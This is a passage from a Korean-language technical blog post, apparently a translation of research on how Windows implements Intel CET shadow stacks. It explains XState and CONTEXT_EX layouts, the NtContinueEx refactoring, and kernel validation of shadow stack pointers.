&#xAE30;&#xB2A5;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC77D;&#xB294;&#xB2E4;.</li></ul></li><li>&#xC704;&#xC5D0;&#xC11C; &#xACC4;&#xC0B0;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; XSAVE &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xAE30;&#xB2A5;&#xC744; &#xCC3E;&#xACE0; &#xC120;&#xD0DD;&#xC801;&#xC73C;&#xB85C; &#xCD9C;&#xB825; &#xAE38;&#xC774; &#xBCC0;&#xC218;&#xC758; &#xD574;&#xB2F9; &#xD06C;&#xAE30;&#xC640; &#xD568;&#xAED8; &#xD574;&#xB2F9; &#xD06C;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC18;&#xD658;&#xD55C;&#xB2E4;.</li></ul><p>&#xC989;, &#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xAE30;&#xB2A5;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xC73C;&#xB824;&#xBA74; <code>SharedUserData</code>&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC555;&#xCD95;&#xB41C; &#xD615;&#xC2DD;&#xC5D0;&#xC11C;&#xB294; <code>SharedUserData</code>&#xC758; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC758;&#xC874;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBBC0;&#xB85C; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xAE30;&#xB2A5;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC774;&#xC804; &#xAE30;&#xB2A5;&#xC758; &#xBAA8;&#xB4E0; &#xD06C;&#xAE30;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACC4;&#xC0B0;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xC77C;&#xBC18;&#xC801;&#xC778; Win32 &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC704;&#xC758; &#xAE30;&#xBCF8; API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC9C0;&#xB9CC; &#xC77C;&#xBD80; &#xC0AC;&#xC804; &#xCC98;&#xB9AC;&#xAC00; &#xC788;&#xB294; &#xB2E4;&#xB978; API&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xAE30;&#xB3C4; &#xD55C;&#xB2E4;. &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8; 0&#xACFC; 1&#xC740; CONTEXT_EX&#xC5D0;&#xC11C; XSAVE &#xC601;&#xC5ED;&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; Win32 API&#xB294; &#xC801;&#xC808;&#xD55C; &#xB808;&#xAC70;&#xC2DC; CONTEXT &#xD544;&#xB4DC; (&#xC989;, <code>XSTATE_LEGACY_FLOATING_POINT</code>&#xC758; &#xACBD;&#xC6B0; FltSave, <code>XSTATE_LEGACY_SSE</code>&#xC758; &#xACBD;&#xC6B0; Xmm0)&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xD55C; &#xB450; &#xAE30;&#xB2A5; &#xBE44;&#xD2B8;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xCC98;&#xB9AC;&#xD55C;&#xB2E4;.</p><pre><code class="hljs c">WINBASEAPIPVOIDWINAPILocateXStateFeature (    _In_ CONTEXT_EX Context,    _In_ DWORD FeatureId,    _Out_opt_ PDWORD Length);</code></pre><h2 id="&#xC608;&#xC81C;-&#xC0AC;&#xC6A9;&#xACFC;-&#xCD9C;&#xB825;"><a href="#&#xC608;&#xC81C;-&#xC0AC;&#xC6A9;&#xACFC;-&#xCD9C;&#xB825;" class="headerlink" title="&#xC608;&#xC81C; &#xC0AC;&#xC6A9;&#xACFC; &#xCD9C;&#xB825;"></a>&#xC608;&#xC81C; &#xC0AC;&#xC6A9;&#xACFC; &#xCD9C;&#xB825;</h2><p>CONTEXT_EX &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xC640; &#xACB0;&#xD569;&#xB41C; &#xACBD;&#xC6B0; XState &#xB0B4;&#xBD80;&#xB97C; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAC04;&#xB2E8;&#xD55C; <a href="https://github.com/yardenshafir/cet-research/tree/master/Xpolicy">&#xD14C;&#xC2A4;&#xD2B8; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</a>&#xC744; &#xC791;&#xC131;&#xD588;&#xB2E4;. &#xC774; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xB294; &#xC77C;&#xBD80; API &#xC0AC;&#xC6A9;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xB2E4;&#xC591;&#xD55C; &#xC624;&#xD504;&#xC14B;, &#xD06C;&#xAE30; &#xBC0F; &#xB3D9;&#xC791;&#xC744; &#xBCF4;&#xC5EC;&#xC900;&#xB2E4;. &#xB2E4;&#xC74C;&#xC740; AVX, MPX &#xBC0F; Intel PT&#xAC00; &#xC788;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; (AVX &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC0AC;&#xC6A9;)&#xC758; &#xCD9C;&#xB825;&#xC774;&#xB2E4;.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/5.png" alt></p><p>&#xBB34;&#xC5C7;&#xBCF4;&#xB2E4;&#xB3C4; &#xB808;&#xAC70;&#xC2DC; CONTEXT&#xAC00; &#xC74C;&#xC218;&#xC778; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xC608;&#xC0C1;&#xB300;&#xB85C; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; x87 FPU &#xC0C1;&#xD0DC;(1) &#xBC0F; GSE &#xC0C1;&#xD0DC;(2)&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xB354;&#xB77C;&#xB3C4; <code>XSAVEBV</code>&#xC5D0;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xBE44;&#xD2B8;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xB808;&#xAC70;&#xC2DC; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xC601;&#xC5ED;&#xC5D0; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;. (&#xB530;&#xB77C;&#xC11C; &#xAD00;&#xB828; &#xC0C1;&#xD0DC; &#xB370;&#xC774;&#xD130;&#xC758; &#xC74C;&#xC218; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC720;&#xC758;&#xD574;&#xC57C; &#xD568;) <code>0x40</code> &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC778; XSAVE &#xD5E4;&#xB354; (&#xC624;&#xD504;&#xC14B; <code>0x30</code>&#xC5D0;&#xC11C; &#xC2DC;&#xC791;) &#xB2E4;&#xC74C;&#xC5D0; AVX &#xC0C1;&#xD0DC;(2)&#xB294; &#xC624;&#xD504;&#xC14B; <code>0x70</code>&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;.</p><h1 id="CONTEXT-EX-&#xC720;&#xD6A8;&#xC131;-&#xAC80;&#xC0AC;"><a href="#CONTEXT-EX-&#xC720;&#xD6A8;&#xC131;-&#xAC80;&#xC0AC;" class="headerlink" title="CONTEXT_EX &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;"></a>CONTEXT_EX &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;</h1><p>&#xC720;&#xC800; &#xBAA8;&#xB4DC; API&#xB294; &#xACB0;&#xAD6D; &#xCEE4;&#xB110;&#xC5D0; &#xC758;&#xD574; &#xCC98;&#xB9AC;&#xB418;&#xACE0; XSAVE &#xC601;&#xC5ED;&#xC758; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xBD80;&#xBD84; (&#xC989;, CET &#xC0C1;&#xD0DC; &#xB370;&#xC774;&#xD130;)&#xC744; &#xC218;&#xC815;&#xD558;&#xB294; CONTEXT_EX&#xB97C; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; Windows&#xB294; CONTEXT_EX&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xB294; API&#xB97C; &#xD1B5;&#xD55C; &#xBC14;&#xB78C;&#xC9C1;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC218;&#xC815;&#xC744; &#xBC29;&#xC9C0;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; :</p><ul><li><code>NtContinue</code> : &#xC608;&#xC678; &#xD6C4; &#xC7AC;&#xAC1C;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xBA70; longjmp CRT &#xAE30;&#xB2A5;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xACE0; &#xC2A4;&#xD0DD; &#xD574;&#xC81C;&#xB97C; &#xC218;&#xD589;&#xD55C;&#xB2E4;.</li><li><code>NtRaiseException</code> : &#xAE30;&#xC874; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xC608;&#xC678;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB428;</li><li><code>NtQueueUserApc</code> : &#xAE30;&#xC874; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB428;</li><li><code>NtSetContextThread</code> : &#xAE30;&#xC874; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD130; / &#xC0C1;&#xD0DC;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB428;</li></ul><p>&#xC774;&#xB7EC;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xD638;&#xCD9C;&#xB85C; &#xC778;&#xD574; &#xCEE4;&#xB110;&#xC774; <code>IA32_PL3_SSP</code> &#xB610;&#xB294; <code>IA32_CET_U</code> MSR&#xC744; &#xC218;&#xC815;&#xD558;&#xACE0; RIP&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; Windows&#xB294; &#xC804;&#xB2EC;&#xB41C; CONTEXT_EX&#xAC00; CET &#xBCF4;&#xC99D;&#xC744; &#xC704;&#xBC18;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p><code>19H1</code>&#xC5D0; SSP&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xACE0; <code>20H1</code>&#xC5D0; RIP &#xAC80;&#xC99D;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xACE7; &#xB2E4;&#xB8F0; &#xC608;&#xC815;&#xC774;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xBA3C;&#xC800; <code>NtContinue</code>&#xC758; &#xC624;&#xC6A9; &#xAC00;&#xB2A5;&#xC131;&#xC744; &#xC904;&#xC774;&#xAE30; &#xC704;&#xD574; &#xC791;&#xC740; &#xB9AC;&#xD329;&#xD130;&#xB9C1;&#xC744; &#xC218;&#xD589;&#xD574;&#xC57C; &#xD588;&#xB2E4;. &#xBC14;&#xB85C; <code>NtContinueEx</code> &#xD568;&#xC218;&#xC758; &#xB3C4;&#xC785;&#xC774;&#xB2E4;.</p><h2 id="NtContinueEX-&#xBC0F;-KCONTINUE-ARGUMENT"><a href="#NtContinueEX-&#xBC0F;-KCONTINUE-ARGUMENT" class="headerlink" title="NtContinueEX &#xBC0F; KCONTINUE_ARGUMENT"></a>NtContinueEX &#xBC0F; KCONTINUE_ARGUMENT</h2><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB300;&#xB85C; <code>NtContinue</code>&#xC758; &#xAE30;&#xB2A5;&#xC740; &#xC5EC;&#xB7EC; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, CET&#xAC00; &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC0C1;&#xD0DC;&#xC5D0; &#xB300;&#xD55C; &#xC784;&#xC758; &#xBCC0;&#xACBD;&#xC744; &#xD5C8;&#xC6A9;&#xD558;&#xB294; API&#xC5D0;&#xC11C; &#xAE30;&#xC874; &#xC0C1;&#xD0DC;&#xB97C; &#xBCF5;&#xC6D0;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB824;&#xBA74; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0; &#xB354; &#xC138;&#xBC00;&#xD55C; &#xC81C;&#xC5B4;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5B4;&#xC57C; &#xD588;&#xB2E4;. &#xC774; &#xC791;&#xC5C5;&#xC740; <code>KCONTINUE_TYPE</code>&#xC774;&#xB77C;&#xB294; &#xC0C8; enumeration&#xC758; &#xC0DD;&#xC131;&#xC744; &#xD1B5;&#xD574; &#xC218;&#xD589;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, <code>KCONTINUE_ARGUMENT</code> &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xC5D0; &#xD604;&#xC7AC; <code>NtContinue</code>&#xC5D0;&#xC11C; <code>NtContinueEx</code>&#xB85C; &#xD5A5;&#xC0C1;&#xB41C; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xC774; &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xC5D0;&#xB294;  <code>ContinueFlags</code> &#xD544;&#xB4DC;&#xAC00; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB2E4;. &#xC774; &#xD544;&#xB4DC;&#xB294;  <code>NtContinue</code>&#xC758; &#xC6D0;&#xB798; <code>TestAlert</code> &#xC778;&#xC218;&#xB97C; <code>CONTINUE_FLAG_RAISE_ALERT (0x1)</code> &#xD50C;&#xB798;&#xADF8;&#xB85C; &#xB300;&#xCCB4;&#xD558;&#xB294; &#xB3D9;&#xC2DC;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; TrapFrame&#xC73C;&#xB85C; APC&#xB97C; &#xC9C1;&#xC811; &#xC804;&#xB2EC;&#xD558;&#xB294;<code>CONTINUE_FLAG_BYPASS_CONTEXT_COPY (0x2)</code> &#xD50C;&#xB798;&#xADF8;&#xB3C4; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xB2E4;. &#xC774;&#xAC83;&#xC740; CONTEXT &#xB808;&#xCF54;&#xB4DC; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC0AC;&#xC6A9;&#xC790; &#xC2A4;&#xD0DD;&#xC758; &#xD2B9;&#xC815; &#xC704;&#xCE58;&#xC5D0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC5EC; &#xC774;&#xC804;&#xC5D0; &#xAD6C;&#xD604;&#xB41C; &#xCD5C;&#xC801;&#xD654;&#xB85C;, &#xD568;&#xC218;&#xAC00; &#xC0AC;&#xC6A9;&#xC790; &#xBAA8;&#xB4DC; APC &#xC804;&#xB2EC;&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;.  &#xC774; &#xB3D9;&#xC791;&#xC744; &#xC6D0;&#xD558;&#xB294; &#xD638;&#xCD9C;&#xC790;&#xB294; <code>ContinueFlags</code>&#xC5D0;&#xC11C; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xC774;&#xC804; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB294; &#xB808;&#xAC70;&#xC2DC;&#xB85C; &#xACC4;&#xC18D; &#xC9C0;&#xC6D0;&#xB418;&#xC9C0;&#xB9CC; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC785;&#xB825; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB97C; <code>KCONTINUE_ARGUMENT</code>&#xAC00; &#xC544;&#xB2CC; <code>BOOLEAN TestAlert</code> &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB85C; &#xC778;&#xC2DD;&#xD558;&#xB294; <code>NtContinueEx</code>&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xACBD;&#xC6B0;&#xB294; &#xC0C8; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; <code>KCONTINUE_UNWIND</code>&#xB85C; &#xCC98;&#xB9AC;&#xB41C;&#xB2E4;.</p><p>&#xC704; &#xB9AC;&#xD329;&#xD130;&#xB9C1;&#xC758; &#xC77C;&#xBD80;&#xB85C; &#xB2E4;&#xC74C; &#xB124; &#xAC00;&#xC9C0; &#xAC00;&#xB2A5;&#xD55C; &#xC720;&#xD615;&#xC774; &#xC788;&#xB2E4;.</p><ul><li><code>KCONTINUE_UNWIND</code> &#x2013; &#xC608;&#xC678;&#xC5D0;&#xC11C; &#xD574;&#xC81C;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>RtlRestoreContext</code> &#xBC0F; <code>LdrInitializeThunk</code>&#xC640; &#xAC19;&#xC740; <code>NtContinue</code>&#xC758; &#xB808;&#xAC70;&#xC2DC; &#xD638;&#xCD9C;&#xC790;&#xAC00; &#xC0AC;&#xC6A9;</li><li><code>KCONTINUE_RESUME</code> &#x2013; <code>NtContinueEx</code>&#xB97C; &#xB2E4;&#xC2DC; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; <code>KiUserApcDispatcher</code>&#xAC00; &#xC2E4;&#xD589;&#xD560; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xC2A4;&#xD0DD;&#xC5D0; <code>KCONTINUE_ARGUMENT</code> &#xAD6C;&#xC870;&#xB97C; &#xBE4C;&#xB4DC;&#xD560; &#xB54C; <code>KiInitializeUserApc</code>&#xAC00; &#xC0AC;&#xC6A9;</li><li><code>KCONTINUE_LONGJUMP</code> &#x2013; &#xC608;&#xC678; &#xB808;&#xCF54;&#xB4DC;&#xC758; &#xC608;&#xC678; &#xCF54;&#xB4DC;&#xAC00; <code>STATUS_LONGJUMP</code> &#xC778; &#xACBD;&#xC6B0; <code>RtlRestoreContext</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>RtlContinueLongJump</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB428;</li><li><code>KCONTINUE_SET</code> &#x2013; <code>NtContinueEx</code>&#xC5D0; &#xC9C1;&#xC811; &#xC804;&#xB2EC;&#xB418;&#xC9C0; &#xC54A;&#xACE0; <code>NtSetContextThread</code> API&#xC5D0; &#xB300;&#xD55C; &#xC751;&#xB2F5;&#xC73C;&#xB85C; <code>PspGetSetContextInternal</code> &#xB0B4;&#xC5D0;&#xC11C; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextIpForUserCet.c">KeVerifyContextIpForUserCet</a>&#xC744; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB428;</li></ul><h2 id="SSP-Shadow-Stack-Pointer-&#xC720;&#xD6A8;&#xC131;-&#xAC80;&#xC0AC;"><a href="#SSP-Shadow-Stack-Pointer-&#xC720;&#xD6A8;&#xC131;-&#xAC80;&#xC0AC;" class="headerlink" title="SSP(Shadow Stack Pointer) &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;"></a>SSP(Shadow Stack Pointer) &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;</h2><p>&#xC55E;&#xC11C; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774; &#xC608;&#xC678; &#xD574;&#xC81C;, APC, longjmp &#xB4F1;&#xACFC; &#xAC19;&#xC774; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xCF54;&#xB4DC;&#xAC00; SSP&#xB97C; &#xBCC0;&#xACBD;&#xD574;&#xC57C; &#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xB294; CET &#xC6B0;&#xD68C; &#xBC29;&#xC9C0;&#xB97C; &#xC704;&#xD574; SSP&#xC5D0; &#xC694;&#xCCAD;&#xB41C; &#xC0C8; &#xAC12;&#xC744; &#xAC80;&#xC99D;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC774;&#xB294; <code>19H1</code>&#xC5D0;&#xC11C; &#xC0C8;&#xB85C;&#xC6B4; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KeVerifyContextXStateCetU.c">KeVerifyContextXStateCetU</a> &#xD568;&#xC218;&#xC5D0; &#xC758;&#xD574; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8;&#xAC00; &#xC218;&#xC815;&#xB418;&#xB294; &#xC2A4;&#xB808;&#xB4DC;&#xC640; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xC0C8; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xC218;&#xC2E0;&#xD558;&#xACE0; &#xB2E4;&#xC74C;&#xC744; &#xC218;&#xD589;&#xD55C;&#xB2E4;.</p><ul><li>CONTEXT_EX&#xC5D0; XState &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xAC70;&#xB098; XState &#xB370;&#xC774;&#xD130;&#xC5D0; CET &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; (<code>XSTATE_CET_U</code> &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xB85C; <code>RtlLocateExtendedFeature2</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD655;&#xC778;) &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xAC00; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;.</li><li>&#xB300;&#xC0C1; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; CET&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; :<ul><li>&#xD638;&#xCD9C;&#xC790;&#xAC00; <code>XSAVEBV</code>&#xC5D0;&#xC11C; <code>XSTATE_MASK_CET_U</code>&#xB97C; &#xB9C8;&#xC2A4;&#xD0B9;&#xD558;&#xC5EC; &#xC774; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; CET&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; &#xD568;&#xC218;&#xB294; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xB97C; &#xB2E4;&#xC2DC; &#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; <code>MSR_IA32_CET_SHSTK_EN</code> (CET&#xC758; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD; &#xAE30;&#xB2A5;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; &#xD50C;&#xB798;&#xADF8;)&#xC744; <code>Ia32CetUMsr</code>&#xC5D0; &#xC124;&#xC815;&#xD558;&#xACE0; &#xD604;&#xC7AC; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD;&#xC744; <code>Ia32Pl3SspMsr</code>&#xB85C; &#xC124;&#xC815;&#xD55C;&#xB2E4;.</li><li>&#xBC18;&#xBA74;&#xC5D0; <a href="https://github.com/yardenshafir/cet-research/blob/master/src/KiVerifyContextXStateCetUEnabled.c">KiVerifyContextXStateCetUEnabled</a>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; CET &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5C8;&#xB294;&#xC9C0;, (<code>MSR_IA32_CET_SHSTK_EN</code> &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;) &#xC0C8; SSP&#xAC00; 8byte&#xB85C; &#xC815;&#xB82C;&#xB418;&#xC5C8;&#xB294;&#xC9C0;, &#xD604;&#xC7AC; SSP &#xAC12;&#xACFC; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD; &#xC601;&#xC5ED;&#xC758; VAD &#xB05D; &#xC0AC;&#xC774;&#xC5D0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC2A4;&#xD0DD;&#xC774; &#xAC70;&#xAFB8;&#xB85C; &#xC131;&#xC7A5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC601;&#xC5ED;&#xC758; &#x201C;&#xB05D;&#x201D;&#xC774; &#xC2E4;&#xC81C;&#xB85C; &#xC2A4;&#xD0DD;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xC774;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xC0C8; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD560; &#xB54C; &#xBAA8;&#xB4E0; SSP &#xAC12;&#xC740; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC0AC;&#xC6A9;&#xB41C; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD; &#xB0B4;&#xC5D0; &#xC788;&#xB294; &#xD55C; &#xC720;&#xD6A8;&#xD558;&#xB2E4;. &#xB610;&#xD55C; &#xC2A4;&#xB808;&#xB4DC;&#xAC00; &#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD; &#xB0B4;&#xBD80;&#xB85C; &#xC774;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC94;&#xC704;&#xC5D0;&#xB294; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xB2E4;.</li></ul></li><li>CET&#xAC00; &#xB300;&#xC0C1; &#xC2A4;&#xB808;&#xB4DC;&#xC5D0;&#xC11C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xACE0; &#xD638;&#xCD9C;&#xC790;&#xAC00; CONTEXT_EX&#xC758; <code>XSAVEBV</code>&#xC5D0; <code>XSTATE_CET_U</code> &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xC5EC; &#xD65C;&#xC131;&#xD654;&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xB450; MSR &#xAC12;&#xC774; &#xBAA8;&#xB450; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xB3C4;&#xB85D; &#xD5C8;&#xC6A9;&#xD55C;&#xB2E4;. (&#xC100;&#xB3C4;&#xC6B0; &#xC2A4;&#xD0DD; X, SSP X)</li></ul><p>&#xC704; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xBA74; <code>STATUS_SET_CONTEXT_DENIED</code>&#xAC00; &#xBC18;&#xD658;&#xB418;&#xACE0; &#xC131;&#xACF5;&#xD558;&#xBA74; <code>STATUS_SUCCESS</code>&#xAC00; &#xBC18;&#xD658;&#xB41C;&#xB2E4;.</p><p>CET&#xB97C; 